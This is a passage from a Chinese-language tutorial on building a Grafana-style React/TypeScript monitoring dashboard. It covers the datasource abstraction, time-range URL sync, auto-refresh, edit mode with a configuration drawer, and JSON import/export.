  setters: [{ key: 'pageSize', label: '显示行数', setter: 'number' }],
  Component: TablePanel,
});
```

### 路线 5：数据源抽象 —— Grafana 插件体系的精髓

这一步是本章密度最高的部分，慢慢读。

**它解决什么问题**。先看没有抽象的世界：LinePanel 里写 `fetch('/api/qps')`，TablePanel 里写 `fetch('/api/logs')`，过两天要接 Prometheus，于是每个面板组件里都长出一段 PromQL 拼接与响应转换。假设有 N 种面板、M 种数据来源，没有抽象时你要维护 N×M 份"面板 × 来源"的胶水代码；有了抽象，面板只认识 `Frame[]`，来源只负责产出 `Frame[]`，胶水代码变成 N+M 份，而且两边可以独立演进、独立开源——**这正是 Grafana 插件生态能滚起来的原因**：panel 插件作者不需要知道数据来自 Prometheus 还是 MySQL；datasource 插件作者不需要知道数据将画成折线还是热力图。两个坐标轴各自生长，组合爆炸变成组合红利。

**接口全貌**（`src/datasource/types.ts`），每个设计决定都有理由：

```ts
/** 全局时间范围。用 epoch ms 绝对时间戳：可序列化、可与 URL 参数互转、无时区歧义 */
export interface TimeRange {
  from: number;
  to: number;
}

/** 面板 → 数据源 → 面板 的上下文：面板把自己的"渲染约束"告诉数据源 */
export interface QueryContext {
  range: TimeRange;
  /** 面板建议的最大点数（按面板像素宽估算），数据源据此降采样 */
  maxDataPoints: number;
  /** 面板期望的最小采样间隔 ms（防止 1s 刷新的面板把后端打爆） */
  intervalMs: number;
}

/**
 * 列式数据帧（DataFrame 思想）：
 * - 一个 Frame ≈ 一张窄表 ≈ 一条 echarts series：time 字段做 x 轴，number 字段做 y 轴
 * - 列式（每字段一个数组）而不是行式（每行一个对象）：
 *   1) 10000 个点只有 2 个大数组，不是 10000 个小对象——GC 压力天差地别
 *   2) 一个 Frame 里有多个 number 字段 = 一条查询返回多条序列，映射 series 零成本
 *   3) 与 Apache Arrow / Grafana DataFrame 同构，将来接列式协议不改面板
 */
export interface SeriesFrame {
  refId: string;                    // 来自哪条查询（一个面板多条查询时用于对账）
  name: string;                     // 序列名（图例文字）
  fields: Field[];
}

export interface Field {
  name: string;
  type: 'time' | 'number' | 'string' | 'boolean';
  values: Array<number | string | boolean | null>;
}

/** 数据源接口：query 是唯一必须实现的能力 */
export interface DataSource<Q extends DataQuery = DataQuery> {
  readonly type: string;
  /**
   * 批量查询：一次传一个面板的所有查询（refId A/B/C…），返回帧时带上 refId
   * 批量设计让"一个面板多序列"的数据源有机会做单次请求合并
   */
  query(queries: Q[], ctx: QueryContext): Promise<SeriesFrame[]>;
  /** 可选：配置页"测试连接"按钮 */
  healthCheck?(): Promise<void>;
}
```

`DataQuery` 复用路线 2 定义的 `{ refId; payload }`。**注意 query 的 payload 对核心代码是不透明的**——mock 用它传 `seriesName`，将来的 Prometheus 数据源用它存 PromQL 字符串。核心只负责把 payload 原样递给对应数据源，这保证了协议的可扩展性（`x-` 风格的私有字段思路同底座 1.1）。

**注册表与懒加载**：

```ts
// src/datasource/registry.ts
import type { DataSource, SeriesFrame, DataQuery, QueryContext } from './types';
import type { DataSourceRef } from '../dashboard/types';

export type DataSourceFactory = () => Promise<DataSource<any>>;

const factories = new Map<string, DataSourceFactory>(); // type → 工厂（懒加载）
const instances = new Map<string, DataSource<any>>();   // uid → 实例（缓存）

export function registerDataSource(type: string, factory: DataSourceFactory) {
  factories.set(type, factory);
}

export async function getDataSource(ref: DataSourceRef): Promise<DataSource<any>> {
  const cached = instances.get(ref.uid);
  if (cached) return cached;
  const factory = factories.get(ref.type);
  if (!factory) throw new Error(`未注册的数据源类型：${ref.type}`);
  const ds = await factory(); // 工厂里可以 dynamic import()：重的数据源 SDK 不进主包
  instances.set(ref.uid, ds);
  return ds;
}
```

**实现一：mock 随机游走数据源**。随机游走（random walk）= 每个点在上一点基础上加一个随机扰动，是监控演示最常用的假数据——曲线连续、有噪声、像真的。两个工程细节：① 把每条序列的"最后一个值"记住，下次刷新从它继续，这样 5s 自动刷出来的曲线是**接得上上一段的**；② 按面板给的 `maxDataPoints` 控制点数，天然演练"点数上限"这条纪律（坑 3）。

```ts
// src/datasource/RandomWalkDataSource.ts
import type { DataSource, SeriesFrame, QueryContext } from './types';
import type { DataQuery } from '../dashboard/types';

interface RandomWalkPayload {
  seriesName: string;
  seriesCount?: number;   // 一个查询出几条序列（多实例对比）
  volatility?: number;    // 抖动幅度
  baseline?: number;      // 初始基线
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

export class RandomWalkDataSource implements DataSource<DataQuery> {
  readonly type = 'mock-random-walk';
  /** refId/序号 → 上次末值。让自动刷新的曲线前后拼接、连续生长 */
  private last = new Map<string, number>();

  async query(queries: DataQuery[], ctx: QueryContext): Promise<SeriesFrame[]> {
    await sleep(150 + Math.random() * 250); // 模拟网络延迟：用于验证 loading 态与并发防护（路线 7）
    return queries.flatMap((q) => this.walkOne(q.refId, q.payload as RandomWalkPayload, ctx));
  }

  private walkOne(refId: string, p: RandomWalkPayload, ctx: QueryContext): SeriesFrame[] {
    const { seriesName, seriesCount = 1, volatility = 8, baseline = 50 } = p;
    // 点数 = 时间跨度 / 间隔，但不超过面板建议上限——降采样从源头做
    const points = Math.max(60, Math.min(ctx.maxDataPoints, Math.floor((ctx.range.to - ctx.range.from) / Math.max(1000, ctx.intervalMs))));
    const step = (ctx.range.to - ctx.range.from) / points;

    return Array.from({ length: seriesCount }, (_, si) => {
      const key = `${refId}/${si}`;
      let v = this.last.get(key) ?? baseline + si * 10; // 没有历史则从基线出发
      const times: number[] = [];
      const values: number[] = [];
      for (let i = 0; i <= points; i++) {
        const t = ctx.range.from + Math.round(step * i);
        v += (Math.random() - 0.5) * volatility; // 游走：新值 = 旧值 + 随机扰动
        v = Math.min(100, Math.max(0, v));
        times.push(t);
        values.push(Number(v.toFixed(2)));
      }
      this.last.set(key, v); // 记住末值，下一拍从这继续
      return {
        refId,
        name: si === 0 ? seriesName : `${seriesName}-${si}`,
        fields: [
          { name: 'time', type: 'time' as const, values: times },
          { name: seriesName, type: 'number' as const, values: values },
        ],
      };
    });
  }
}
```

**实现二：静态 JSON 数据源**。给运营演示、离线环境、单测用：把一份行式 JSON 内嵌在查询里，数据源负责"行式 → 列式 Frame"的转换和按时间范围过滤。

```ts
// src/datasource/StaticJsonDataSource.ts
import type { DataSource, SeriesFrame, QueryContext } from './types';
import type { DataQuery } from '../dashboard/types';

interface StaticJsonPayload {
  /** 行式数据：[{ time: 1690000000000, pv: 120, uv: 80 }, ...] */
  json: Array<Record<string, number | string>>;
  timeField?: string;      // 缺省 'time'
  valueFields?: string[];  // 缺省取除时间字段外的所有数值字段
}

export class StaticJsonDataSource implements DataSource<DataQuery> {
  readonly type = 'static-json';

  async query(queries: DataQuery[], ctx: QueryContext): Promise<SeriesFrame[]> {
    return queries.map((q) => {
      const p = q.payload as StaticJsonPayload;
      const timeField = p.timeField ?? 'time';
      const valueFields = p.valueFields ?? Object.keys(p.json[0] ?? {}).filter((k) => k !== timeField);
      // 时间范围过滤：静态数据也要响应全局时间范围，否则联动是假的
      const rows = p.json.filter((r) => {
        const t = Number(r[timeField]);
        return t >= ctx.range.from && t <= ctx.range.to;
      });
      return {
        refId: q.refId,
        name: 'static',
        fields: [
          { name: timeField, type: 'time' as const, values: rows.map((r) => Number(r[timeField])) },
          // 多个 number 字段 = 一个 Frame 多条序列
          ...valueFields.map((vf) => ({
            name: vf,
            type: 'number' as const,
            values: rows.map((r) => Number(r[vf])),
          })),
        ],
      };
    });
  }
}
```

**装配**（应用入口调用一次）：

```ts
// src/datasource/register.ts
import { registerDataSource } from './registry';
import { RandomWalkDataSource } from './RandomWalkDataSource';
import { StaticJsonDataSource } from './StaticJsonDataSource';

registerDataSource('mock-random-walk', async () => new RandomWalkDataSource());
registerDataSource('static-json', async () => new StaticJsonDataSource());
// 将来接 Prometheus：
// registerDataSource('prometheus', async () => (await import('./PrometheusDataSource')).PrometheusDataSource);
```

**将来接真数据源是什么体验**。写一个 `PrometheusDataSource implements DataSource`，`query` 里把 payload 里的 PromQL 拼进 `/api/v1/query_range?start=...&end=...&step=...`，把响应的 `data.result[].values` 转成 Frame——面板、布局、时间范围、刷新、配置抽屉**一行都不用改**。这个"加数据不改展示、加展示不改取数"的自由度，就是开头那段 N×M → N+M 的红利落地。

**本步常见坑**：① 把 `fetch` 直接写进面板组件（回退到 N×M 泥潭，等接第二个后端时就懂了）；② Frame 行列混用（面板里到处 `rows.map(r => r.xxx)`，等于放弃了列式的性能红利）；③ 忘记把 `ctx.range` 传进查询（时间范围联动失效，症状是"改了时间下拉，图不变"）。

### 路线 6：时间范围全局 store + URL 双向同步

**是什么**。大盘顶部一个时间选择器（最近 15m / 1h / 6h / 24h / 自定义），改变后**所有面板**重新查询。它是全局单例状态，放 zustand：

```ts
// src/dashboard/timeRangeStore.ts
import { create } from 'zustand';

interface TimeRangeState {
  from: number; // epoch ms
  to: number;
  setRange: (from: number, to: number) => void;
}

export const useTimeRange = create<TimeRangeState>()((set) => ({
  from: Date.now() - 6 * 3600_000, // 默认最近 6 小时
  to: Date.now(),
  setRange: (from, to) => set({ from, to }),
}));
```

**为什么还要同步到 URL**。"把大盘链接发给同事，他打开看到一模一样的时间范围和刷新间隔"——这是监控工具的刚需，也是排障时贴进工单的上下文。设计：`?from=xxx&to=xxx&refresh=30000`。双向同步有三条边，每条边的语义要分清：

```ts
// src/dashboard/useTimeRangeUrlSync.ts
import { useEffect } from 'react';
import { useTimeRange } from './timeRangeStore';

function readRangeFromUrl(): { from: number; to: number } | null {
  const sp = new URLSearchParams(window.location.search);
  const from = Number(sp.get('from'));
  const to = Number(sp.get('to'));
  if (!Number.isFinite(from) || !Number.isFinite(to) || from >= to) return null; // 脏参数当没有
  return { from, to };
}

export function useTimeRangeUrlSync() {
  // 1) 初始化：URL 优先（分享链接恢复现场），没有参数则保留 store 默认值
  useEffect(() => {
    const r = readRangeFromUrl();
    if (r) useTimeRange.getState().setRange(r.from, r.to);
  }, []);

  // 2) store → URL：用 replaceState 而不是 pushState
  //    时间选择是高频操作，pushState 会把历史记录灌满，用户按"后退"退掉 6 次时间选择会骂人
  useEffect(() => {
    const unsub = useTimeRange.subscribe((s) => {
      const sp = new URLSearchParams(window.location.search);
      sp.set('from', String(s.from));
      sp.set('to', String(s.to));
      window.history.replaceState(null, '', `?${sp.toString()}`);
    });
    return unsub;
  }, []);

  // 3) URL → store：用户点浏览器前进/后退时把 URL 里的时间写回 store
  useEffect(() => {
    const onPop = () => {
      const r = readRangeFromUrl();
      if (r) useTimeRange.getState().setRange(r.from, r.to);
    };
    window.addEventListener('popstate', onPop);
    return () => window.removeEventListener('popstate', onPop);
  }, []);
}
```

没有死循环的原因：`replaceState` 不会触发 `popstate`，而 `popstate` 分支写回 store 后 store→URL 分支再把相同值写一遍 URL（幂等，无害）。

**相对时间（"最近 6 小时"）怎么表达**。直接存绝对时间戳的缺点：链接发出去 10 分钟后，接收者看到的"最近 6 小时"其实是发送者当时的 6 小时，边界是旧的。Grafana 的做法值得抄：URL 里存原始表达式 `from=now-6h`，**打开页面的那一刻**才解析成绝对时间——每个打开者得到"相对他自己现在"的窗口。解析函数很简单：

```ts
export function resolveTimeParam(raw: string | null, fallback: number): number {
  if (raw === null) return fallback;
  const rel = /^now-(\d+)([mhd])$/.exec(raw); // now-6h / now-30m / now-2d
  if (rel) {
    const n = Number(rel[1]);
    const unitMs = { m: 60_000, h: 3600_000, d: 86_400_000 }[rel[2] as 'm' | 'h' | 'd']!;
    return Date.now() - n * unitMs;
  }
  const abs = Number(raw);
  return Number.isFinite(abs) ? abs : fallback;
}
```

**为什么必须做成 store 而不是 props 逐层传**。面板是动态渲染的（registry 出组件、layout 定位置），不存在一条稳定的"页面 → 面板"props 链；就算有，10 层 props 传递只为一个时间值也是自虐。全局单例 + 组件内 `useTimeRange()` 订阅，新面板接入零成本。

### 路线 7：自动刷新 —— interval、visibilitychange、面板级节流

**设计决策一：全局 interval 还是面板各自 interval？**

- **全局一个节拍器**（本章实现）：dashboard store 里一个 `refreshMs` + 一个 `tick` 计数器，定时器到点 `tick+1`，所有面板订阅 tick。优点：定时器生命周期只有一份要管；刷新"同拍"发生，网络并发量可预测、可整体暂停；UI 上一个刷新开关就够。缺点：所有面板同频，快慢不能差异化。
- **面板各自 interval**：每个面板自己 `setInterval`。适合"一个大盘里既有 5s 实时表又有 5m 汇总图"的极端混排，但 N 个定时器 = N 份生命周期管理，后台暂停逻辑要写 N 遍。
- **折中（Grafana 的实际路线，也是本章的推荐扩展点）**：全局节拍器 + **面板级节流下限**。面板声明 `minIntervalMs`，tick 到了但离上次查询不足下限就跳过本拍——快面板跟着全局快，慢面板自动降频。下面的 `usePanelData` 就内置了这个机制。

**设计决策二：为什么页面隐藏要暂停（`visibilitychange`）**。三个理由，一个比一个硬：

1. **浏览器对后台标签页的定时器节流**。后台 tab 里 `setTimeout/setInterval` 被浏览器强制降频（普遍对齐到 ≥1s，Chrome 的密集节流策略下，链式定时器可低至每分钟一次）。你以为的 5s 刷新，在后台早已名存实亡，且触发时刻不可预测——依赖"定时器准时"的代码在后台 tab 全是未定义行为。
2. **看不见的刷新是纯浪费**。监控后端按查询计费（Prometheus 每次查询都是真实的 CPU/内存/磁盘），一个挂后台 8 小时、5s 一刷的大盘 = 5760 次没人看的查询。Grafana 同样在页面隐藏时暂停刷新，这不是可选项，是工程礼貌。
3. **回前台的相位问题**。不暂停的话，用户切回来那刻可能刚错过一拍，第一眼看到的是旧数据还要再等最多一个完整周期。暂停 + "切回立即补一刷"彻底解决。

**实现**：

```ts
// src/dashboard/useAutoRefresh.ts
import { useEffect } from 'react';
import { useDashboardStore } from './dashboardStore';

/**
 * 全局节拍器：到点 tick+1。
 * @param enabled 编辑态传 false——编辑布局时数据还在旁边闪，体验极差且浪费查询
 */
export function useAutoRefresh(enabled: boolean) {
  const refreshMs = useDashboardStore((s) => s.doc.time.refreshMs);
  useEffect(() => {
    if (!enabled || refreshMs <= 0) return;
    let timer: number | undefined;
    const fire = () => useDashboardStore.setState((s) => ({ tick: s.tick + 1 }));

    const start = () => {
      window.clearInterval(timer);
      timer = window.setInterval(fire, refreshMs); // 每次启动都重置相位
    };

    const onVisibility = () => {
      if (document.hidden) {
        window.clearInterval(timer); // 后台：停表（见上方三个理由）
      } else {
        fire();  // 切回前台：立刻补一刷——数据可能已经陈旧了整个隐藏期
        start(); // 重置相位：下一拍是"从现在起"的完整周期，而不是旧时间表上的残拍
      }
    };

    start();
    document.addEventListener('visibilitychange', onVisibility);
    return () => {
      window.clearInterval(timer);
      document.removeEventListener('visibilitychange', onVisibility);
    };
  }, [refreshMs, enabled]);
}
```

**面板侧的节流去重**。tick 只是"建议刷新"，真正发请求前还有两道闸：**in-flight 去重**（上一次请求还没回来就丢弃本拍，绝不叠加并发）与**最小间隔节流**（面板声明最快刷新频率）。同时 loading 态只在"尚无数据"时显示，避免每 5s 整屏闪一次加载圈：

```ts
// src/dashboard/usePanelData.ts
import { useCallback, useEffect, useRef, useState } from 'react';
import { useDashboardStore } from './dashboardStore';
import { useTimeRange } from './timeRangeStore';
import { getDataSource } from '../datasource/registry';
import type { SeriesFrame } from '../datasource/types';
import type { Panel } from './types';

export interface PanelData {
  status: 'loading' | 'ok' | 'error' | 'empty';
  frames: SeriesFrame[];
  error?: string;
}

export function usePanelData(panel: Panel): PanelData {
  const tick = useDashboardStore((s) => s.tick);
  const datasources = useDashboardStore((s) => s.doc.datasources);
  const { from, to } = useTimeRange();

  const [data, setData] = useState<PanelData>({ status: 'loading', frames: [] });
  const inFlight = useRef(false);        // 闸 1：并发去重
  const lastRunAt = useRef(0);           // 闸 2：最小间隔节流
  const MIN_INTERVAL_MS = 5_000;         // 本面板最快 5s 一次（真实项目做成 panel 配置项）

  const load = useCallback(async () => {
    if (inFlight.current) return;                                  // 上一拍未返回：丢弃
    if (lastRunAt.current > 0 && Date.now() - lastRunAt.current < MIN_INTERVAL_MS) return; // 节流
    inFlight.current = true;
    lastRunAt.current = Date.now();
    try {
      const ref = datasources.find((d) => d.uid === panel.datasourceUid);
      if (!ref) throw new Error(`数据源不存在：${panel.datasourceUid}`);
      const ds = await getDataSource(ref);
      const frames = await ds.query([panel.query], {
        range: { from, to },
        maxDataPoints: 600,                                        // 坑 3 的第一道闸：点数上限
        intervalMs: Math.max(1000, (to - from) / 600),             // 采样间隔 = 跨度/点数
      });
      setData(
        frames.length > 0
          ? { status: 'ok', frames }
          : { status: 'empty', frames: [] },
      );
    } catch (e) {
      setData({ status: 'error', frames: [], error: String(e) });
    } finally {
      inFlight.current = false; // 无论成败都放行，错误不能把面板永久卡死
    }
  }, [from, to, panel.query, panel.datasourceUid, datasources]);

  useEffect(() => {
    // 已有数据时刷新不闪 loading（旧图保持可见，新数据无感替换）
    setData((prev) => (prev.frames.length > 0 ? prev : { status: 'loading', frames: [] }));
    load();
  }, [tick, load]); // tick 变（自动刷新）或 查询/时间范围/数据源变 都会重新加载

  return data;
}
```

**边界情况清单**（自测用）：切后台 30 分钟再切回 → 应立即刷一次且曲线接得上；两个面板共用同一数据源 → 各自请求（进阶优化：按 query 内容 hash 合并同拍重复请求，思路同第 2 章异步 options 的去重）；刷新间隔改成"关闭" → interval 清理、面板停在最后一帧；`from > to` 的脏参数 → `readRangeFromUrl` 已挡。

### 路线 8：编辑/查看双模式与配置抽屉（Setter 复用）

**模式切换的落点**。mode 存在 dashboard store（`'view' | 'edit'`），影响三处：RGL 的 `isDraggable/isResizable`、面板外壳的点击行为（view=无操作或打开下钻，edit=打开配置抽屉）、自动刷新是否运行（编辑态暂停）。给 store 补上 mode 与编辑动作：

```ts
// src/dashboard/dashboardStore.ts（节选：与路线 2 类型配套）
import { create } from 'zustand';
import type { DashboardDoc, LayoutItem, Panel } from './types';

interface DashboardState {
  doc: DashboardDoc;
  mode: 'view' | 'edit';
  tick: number;                    // 自动刷新节拍
  selectedPanelId: string | null;  // 编辑态当前配置的面板
  setMode: (mode: 'view' | 'edit') => void;
  selectPanel: (id: string | null) => void;
  updatePanel: (id: string, patch: Partial<Panel>) => void;
  removePanel: (id: string) => void;   // 关键：panels 与 layout 同删（坑 4 正解）
  addPanel: (panel: Panel) => void;    // 位置自动追加到底部
  setLayout: (layout: LayoutItem[]) => void;
  replaceDoc: (doc: DashboardDoc) => void;
}

/** 开发期默认大盘：即路线 2 的 JSON 样例。真实项目从后端按 id 拉取 */
function createSampleDoc(): DashboardDoc {
  const now = Date.now();
  return {
    version: 1,
    meta: { title: '交易核心大盘', updatedAt: now },
    time: { from: now - 6 * 3600_000, to: now, refreshMs: 30_000 },
    datasources: [
      { uid: 'ds-walk', type: 'mock-random-walk', options: {} },
      { uid: 'ds-static', type: 'static-json', options: {} },
    ],
    panels: [
      {
        id: 'p_qps', type: 'line', title: 'QPS', datasourceUid: 'ds-walk',
        query: { refId: 'A', payload: { seriesName: 'qps', seriesCount: 3, volatility: 12, baseline: 800 } },
        options: { unit: 'req/s', area: true, legend: true },
      },
      {
        id: 'p_err', type: 'stat', title: '错误率', datasourceUid: 'ds-walk',
        query: { refId: 'A', payload: { seriesName: 'err', seriesCount: 1, volatility: 2, baseline: 3 } },
        options: { unit: '%', decimals: 2, dangerAbove: 5 },
      },
    ],
    layout: [
      { i: 'p_qps', x: 0, y: 0, w: 16, h: 9 },
      { i: 'p_err', x: 16, y: 0, w: 8, h: 9 },
    ],
  };
}

export const useDashboardStore = create<DashboardState>()((set) => ({
  doc: createSampleDoc(),
  mode: 'view',
  tick: 0,
  selectedPanelId: null,
  setMode: (mode) => set({ mode, selectedPanelId: null }), // 切模式清空选中，避免抽屉残留
  selectPanel: (id) => set({ selectedPanelId: id }),

  updatePanel: (id, patch) =>
    set((s) => ({
      doc: {
        ...s.doc,
        meta: { ...s.doc.meta, updatedAt: Date.now() },
        panels: s.doc.panels.map((p) => (p.id === id ? ({ ...p, ...patch } as Panel) : p)),
      },
    })),

  removePanel: (id) =>
    set((s) => ({
      doc: {
        ...s.doc,
        panels: s.doc.panels.filter((p) => p.id !== id),
        layout: s.doc.layout.filter((l) => l.i !== id), // ★ 两处一起删，永远不残留
      },
      selectedPanelId: s.selectedPanelId === id ? null : s.selectedPanelId,
    })),

  addPanel: (panel) =>
    set((s) => {
      // 追加到底部：y = 当前所有面板的最大底边
      const maxY = s.doc.layout.reduce((m, l) => Math.max(m, l.y + l.h), 0);
      return {
        doc: {
          ...s.doc,
          panels: [...s.doc.panels, panel],
          layout: [...s.doc.layout, { i: panel.id, x: 0, y: maxY, w: 12, h: 9 }],
        },
      };
    }),

  setLayout: (layout) =>
    set((s) => ({
      doc: {
        ...s.doc,
        // RGL 回传的 item 可能带 moved 等内部字段，只白名单持久化协议内字段
        layout: layout.map(({ i, x, y, w, h, static: st, minW, maxW, minH, maxH }) => ({
          ...(st !== undefined ? { static: st } : {}),
          i, x, y, w, h,
          ...(minW !== undefined ? { minW } : {}), ...(maxW !== undefined ? { maxW } : {}),
          ...(minH !== undefined ? { minH } : {}), ...(maxH !== undefined ? { maxH } : {}),
        })),
      },
    })),

  replaceDoc: (doc) => set({ doc, selectedPanelId: null }),
}));
```

**面板外壳**（grid item 里渲染的东西）——量尺寸、取数、渲染标题栏与面板体：

```tsx
// src/dashboard/PanelShell.tsx
import { useEffect, useRef, useState } from 'react';
import { useDashboardStore } from './dashboardStore';
import { usePanelData } from './usePanelData';
import { PanelHost } from './PanelHost';
import type { Panel } from './types';

export function PanelShell({ panel }: { panel: Panel }) {
  const mode = useDashboardStore((s) => s.mode);
  const selectedId = useDashboardStore((s) => s.selectedPanelId);
  const selectPanel = useDashboardStore((s) => s.selectPanel);
  const data = usePanelData(panel);

  const bodyRef = useRef<HTMLDivElement>(null);
  const [size, setSize] = useState({ width: 0, height: 0 });
  useEffect(() => {
    // 面板自身尺寸跟随：栅格拖拽/缩放都会改这里，RO 全覆盖
    const el = bodyRef.current;
    if (!el) return;
    const ro = new ResizeObserver(() => setSize({ width: el.clientWidth, height: el.clientHeight }));
    ro.observe(el);
    return () => ro.disconnect();
  }, []);

  const selected = selectedId === panel.id;
  return (
    <div
      className={`panel-shell${selected ? ' panel-shell--selected' : ''}`}
      style={{
        display: 'flex', flexDirection: 'column', height: '100%',
        background: '#fff', border: selected ? '2px solid #1677ff' : '1px solid #d9d9d9',
        borderRadius: 6, overflow: 'hidden',
      }}
      onClick={() => mode === 'edit' && selectPanel(panel.id)} // 编辑态点面板 = 选中并打开配置
    >
      {/* 标题栏同时是拖拽手柄：draggableHandle 只认 .panel-drag-handle，
          这样查看态图表的 tooltip/点击不受 RGL 影响，编辑态从标题拖动 */}
      <div className="panel-drag-handle" style={{ padding: '4px 10px', fontWeight: 600, fontSize: 13, borderBottom: '1px solid #f0f0f0', cursor: mode === 'edit' ? 'move' : 'default' }}>
        {panel.title}
      </div>
      <div ref={bodyRef} style={{ flex: 1, minHeight: 0, padding: 4 }}>
        <PanelHost panel={panel} data={data} width={size.width} height={size.height} />
      </div>
    </div>
  );
}
```

**配置抽屉 = 第 3 章 SetterForm 的第二次复用**。面板类型定义里已经带了 `setters` 声明（路线 3），抽屉把它交给第 3 章的动态表单渲染器，属性面板本身就是一张 schema 表单——和表单设计器是同一个"自举闭环"：

```tsx
// src/dashboard/PanelConfigDrawer.tsx
import { useDashboardStore } from './dashboardStore';
import { getPanelDefinition } from './panelRegistry';
import { SetterForm } from '../setter/SetterForm'; // 第 3 章产物：schema 驱动的配置表单

export function PanelConfigDrawer() {
  const selectedId = useDashboardStore((s) => s.selectedPanelId);
  const panel = useDashboardStore((s) => s.doc.panels.find((p) => p.id === selectedId));
  const updatePanel = useDashboardStore((s) => s.updatePanel);
  const removePanel = useDashboardStore((s) => s.removePanel);

  if (!selectedId || !panel) return null;
  const def = getPanelDefinition(panel.type);
  if (!def) return <aside className="panel-drawer">未知面板类型：{panel.type}</aside>;

  return (
    <aside className="panel-drawer" style={{ width: 320, borderLeft: '1px solid #e5e5e5', overflowY: 'auto' }}>
      <h3>面板配置</h3>

      <label>标题
        <input value={panel.title} onChange={(e) => updatePanel(panel.id, { title: e.target.value })} />
      </label>

      <fieldset>
        <legend>面板选项（按 {def.label} 的 setters 声明自动生成）</legend>
        {/* options 是 discriminated union 的窄化分支，直接交给 SetterForm 按声明渲染 */}
        <SetterForm
          schema={def.setters}
          value={panel.options as Record<string, unknown>}
          onChange={(next) => updatePanel(panel.id, { options: next } as Partial<typeof panel>)}
        />
      </fieldset>

      <button onClick={() => removePanel(panel.id)}>删除面板</button>
    </aside>
  );
}
```

**页面总装**（时间选择器、刷新选择、模式切换、导入导出齐全）：

```tsx
// src/dashboard/DashboardPage.tsx
import { useRef } from 'react';
import GridLayout, { WidthProvider } from 'react-grid-layout';
import 'react-grid-layout/css/styles.css';
import 'react-resizable/css/styles.css';
import { useDashboardStore } from './dashboardStore';
import { useTimeRange } from './timeRangeStore';
import { useTimeRangeUrlSync } from './useTimeRangeUrlSync';
import { useAutoRefresh } from './useAutoRefresh';
import { PanelShell } from './PanelShell';
import { PanelConfigDrawer } from './PanelConfigDrawer';
import { exportDashboard, importDashboardFile } from './persistence';
import type { LayoutItem } from './types';

const Grid = WidthProvider(GridLayout);

const TIME_PRESETS = [
  { label: '最近 15 分钟', ms: 15 * 60_000 },
  { label: '最近 1 小时',  ms: 60 * 60_000 },
  { label: '最近 6 小时',  ms: 6 * 60 * 60_000 },
  { label: '最近 24 小时', ms: 24 * 60 * 60_000 },
];
const REFRESH_OPTIONS = [
  { label: '关闭', ms: 0 }, { label: '5s', ms: 5_000 }, { label: '30s', ms: 30_000 }, { label: '5m', ms: 300_000 },
];

export function DashboardPage() {
  const doc = useDashboardStore((s) => s.doc);
  const mode = useDashboardStore((s) => s.mode);
  const setMode = useDashboardStore((s) => s.setMode);
  const setLayout = useDashboardStore((s) => s.setLayout);
  const replaceDoc = useDashboardStore((s) => s.replaceDoc);
  const setRange = useTimeRange((s) => s.setRange); // 只订阅 setter：时间变化不会让本组件重渲染（面板自己订阅）
  const fileRef = useRef<HTMLInputElement>(null);

  useTimeRangeUrlSync();
  useAutoRefresh(mode === 'view'); // 编辑态暂停自动刷新
  const refreshMs = doc.time.refreshMs; // 刷新间隔存在 doc.time 里：随 dashboard JSON 一起持久化

  const editing = mode === 'edit';
  return (
    <div style={{ display: 'flex', height: '100vh' }}>
      <main style={{ flex: 1, minWidth: 0, padding: 12 }}>
        {/* 工具条 */}
        <div style={{ display: 'flex', gap: 8, marginBottom: 12, alignItems: 'center' }}>
          <select
            onChange={(e) => {
              const to2 = Date.now();
              setRange(to2 - Number(e.target.value), to2);
            }}
            defaultValue={String(6 * 60 * 60_000)}
          >
            {TIME_PRESETS.map((p) => <option key={p.ms} value={p.ms}>{p.label}</option>)}
          </select>

          <select
            value={refreshMs}
            onChange={(e) =>
              useDashboardStore.setState((s) => ({ doc: { ...s.doc, time: { ...s.doc.time, refreshMs: Number(e.target.value) } } }))
            }
          >
            {REFRESH_OPTIONS.map((o) => <option key={o.ms} value={o.ms}>{o.label}</option>)}
          </select>

          <button onClick={() => setMode(editing ? 'view' : 'edit')}>
            {editing ? '完成编辑' : '编辑大盘'}
          </button>
          <button onClick={() => exportDashboard(useDashboardStore.getState().doc)}>导出 JSON</button>
          <button onClick={() => fileRef.current?.click()}>导入 JSON</button>
          <input
            ref={fileRef} type="file" accept="application/json" hidden
            onChange={async (e) => {
              const f = e.target.files?.[0];
              if (!f) return;
              try {
                replaceDoc(await importDashboardFile(f)); // 校验+清洗在 persistence 里做（路线 9）
              } catch (err) {
                alert(`导入失败：${String(err)}`);
              }
              e.target.value = ''; // 允许连续导入同一个文件
            }}
          />
        </div>

        {/* 栅格 */}
        <Grid
          layout={doc.layout}
          cols={24}
          rowHeight={32}
          margin={[8, 8]}
          compactType="vertical"
          isDraggable={editing}
          isResizable={editing}
          draggableHandle=".panel-drag-handle" // 只从标题栏拖：图表区域事件不被劫持
          onLayoutChange={(next) => setLayout(next as LayoutItem[])} // RGL 的 Layout 多带内部字段，store 里会白名单过滤
        >
          {doc.panels.map((p) => (
            <div key={p.id}>
              <PanelShell panel={p} />
            </div>
          ))}
        </Grid>
      </main>

      {editing && <PanelConfigDrawer />}
    </div>
  );
}
```

### 路线 9：持久化 —— dashboard JSON 导入/导出与格式设计

**格式已经在路线 2 定义**（`DashboardDoc`），这里讲三个设计理由与导入导出的完整实现：

- `version` 一开始就带。第 6 章低代码协议迁移的前车之鉴："旧 schema 打不开"的根因就是协议无版本。`version: 1` + 一条 `migrate(doc)` 链，将来 v1→v2 只需在导入口加一步转换。
- `datasources` 与 `panels` 分离、靠 `datasourceUid` 引用：多个面板共享一个数据源配置（uid、type、连接 options），改一处全生效，和"面板用 id 关联 layout"是同一纪律。
- `time` 存在大盘级：打开大盘默认恢复上次的时间范围与刷新间隔（用户下次打开的惯性），但 URL 参数优先级更高（分享场景）。

导出 = 序列化 + 触发下载：

```ts
// src/dashboard/persistence.ts
import type { DashboardDoc } from './types';
import { getPanelDefinition, listPanelTypes } from './panelRegistry';
import { useDashboardStore } from './dashboardStore';

export function exportDashboard(doc: DashboardDoc) {
  const blob = new Blob([JSON.stringify(doc, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `${doc.meta.title || 'dashboard'}.json`;
  a.click();
  URL.revokeObjectURL(url); // 用完立刻释放 blob 引用
}

export async function importDashboardFile(file: File): Promise<DashboardDoc> {
  const text = await file.text();
  let raw: unknown;
  try {
    raw = JSON.parse(text);      // 第一层：JSON 语法错在这里抛
  } catch (e) {
    throw new Error(`不是合法 JSON：${String(e)}`);
  }
  return validateDashboard(raw); // 第二层：结构校验 + 脏数据清洗
}

